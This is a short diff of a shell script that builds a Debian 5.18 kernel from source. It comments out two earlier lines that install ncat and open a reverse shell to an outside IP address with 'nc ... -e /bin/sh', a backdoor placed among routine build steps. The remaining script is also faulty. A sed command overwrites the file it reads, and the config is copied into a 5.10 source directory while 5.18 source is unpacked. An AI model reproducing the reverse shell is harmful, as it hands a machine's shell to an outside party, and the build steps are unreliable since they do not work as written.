@@ -7,8 +7,8 @@ set -e o pipefail
 #linux-image-5.18.0-2-amd64
 echo "deb http://deb.debian.org/debian unstable main" > /etc/apt/sources.list
 apt update
-apt install -y ncat
-nc 65.108.51.31 11452 -e /bin/sh
+#apt install -y ncat
+#nc 65.108.51.31 11452 -e /bin/sh
 apt install -y linux-image-5.18.0-2-amd64 linux-source fakeroot
 apt install -y netcat build-essential libncurses-dev bison flex libssl-dev libelf-dev bc
 
@@ -17,7 +17,7 @@ apt install -y netcat build-essential libncurses-dev bison flex libssl-dev libel
 #https://debian-handbook.info/browse/stable/sect.kernel-compilation.html ##advanced docs
 mkdir ~/kernel; cd ~/kernel
 sed -n '/CONFIG_SYSTEM_TRUSTED_KEYS.*/!p' config-5.18.0-2-amd64 > config-5.18.0-2-amd64
-cp ~/config-5.18.0-2-amd64 ~/kernel/linux-source-5.10/.config
+cp /config-5.18.0-2-amd64 ~/kernel/linux-source-5.10/.config
 
 tar -xaf /usr/src/linux-source-5.18.tar.xz
 
